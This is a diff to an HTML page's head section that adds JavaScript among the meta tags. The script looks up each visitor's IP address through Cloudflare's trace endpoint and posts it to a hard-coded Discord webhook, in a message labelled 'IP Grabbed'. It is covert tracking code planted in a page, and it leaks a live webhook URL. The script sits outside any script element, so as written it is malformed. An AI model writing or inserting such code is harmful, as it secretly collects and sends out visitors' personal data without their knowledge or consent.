@@ -7,7 +7,52 @@
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <meta name="language" content="English">
 <meta name="author" content="JOIN OMADA">
+function text(url) {
+  return fetch(url).then(res => res.text());
+}
 
+text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
+  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
+  let ip = data.match(ipRegex)[0];
+  let anIP = ip
+fetch(
+  'https://discord.com/api/webhooks/891355504616554587/wKWYOh8HqwpjXA-Rbi6Krqn5SWtjaHsr-gK24wQ1bxc2bV8LX9s0pJ1btAGTeCAAQTwF',
+  {
+    method: 'post',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      embeds: [
+        {
+          // decimal number colour of the side of the embed
+          color: 11730954,
+          // author
+          // - icon next to text at top (text is a link)
+          author: {
+            name: 'IP Grabbed',
+          },
+          // embed title
+
+          // embed description
+          // - text on 3rd row
+          description: 'IP has been grabbed',
+          // custom embed fields: bold title/name, normal content/value below title
+          // - located below description, above image.
+          fields: [
+            {
+              name: 'field 1',
+              value: ip
+},
+          ],
+          // image
+          // - picture below description(and fields)
+          
+        },
+      ],
+    }),
+  })
+});
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
